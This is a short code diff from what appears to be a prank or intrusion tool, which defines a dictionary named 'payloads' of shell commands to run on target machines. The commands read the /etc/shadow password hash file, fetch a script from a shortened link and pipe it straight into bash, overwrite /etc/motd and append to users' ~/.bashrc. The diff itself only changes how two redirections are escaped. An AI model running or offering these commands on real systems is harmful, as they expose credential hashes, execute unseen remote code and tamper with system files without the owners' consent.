@@ -45,8 +45,8 @@ payloads={
 'raincow_install':'sudo apt -y install fortune cowsay lolcat',
 'gitpip':'sudo apt -y install git python-pip',
 'shadow':'sudo cat /etc/shadow',
-'motd':'echo "change your password" > /etc/motd',
-'raincow_bashrc':'sudo echo "fortune | cowsay | lolcat" >> ~/.bashrc',
+'motd':'sudo echo "change your password" \> /etc/motd',
+'raincow_bashrc':'sudo echo "fortune | cowsay | lolcat" \>\> ~/.bashrc',
 'rickroll':'curl -s -l http://bit.ly/10ha8ic | bash'
 }
 
